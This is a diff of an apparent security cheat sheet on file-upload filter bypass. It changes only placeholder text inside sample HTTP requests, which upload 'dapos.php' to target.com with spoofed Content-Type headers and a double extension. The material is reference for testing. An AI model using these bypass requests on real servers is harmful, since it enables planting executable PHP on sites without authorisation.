@@ -11,7 +11,7 @@ In upload file feature, for example upload photo profile feature
 ```
 POST /images/upload/ HTTP/1.1
 Host: target.com
-[...]
+...
 
 ---------------------------829348923824
 Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
@@ -21,7 +21,7 @@ Change the Content-Type
 ```
 POST /images/upload/ HTTP/1.1
 Host: target.com
-[...]
+...
 
 ---------------------------829348923824
 Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
@@ -32,7 +32,7 @@ Content-Type: image/jpeg
 ```
 POST /images/upload/ HTTP/1.1
 Host: target.com
-[...]
+...
 
 ---------------------------829348923824
 Content-Disposition: form-data; name="uploaded"; filename="dapos.php.jpg"
@@ -42,7 +42,7 @@ Change the request to this
 ```
 POST /images/upload/ HTTP/1.1
 Host: target.com
-[...]
+...
 
 ---------------------------829348923824
 Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
@@ -53,7 +53,7 @@ Content-Type: application/x-php
 ```
 POST /images/upload/ HTTP/1.1
 Host: target.com
-[...]
+...
 
 ---------------------------829348923824
 Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
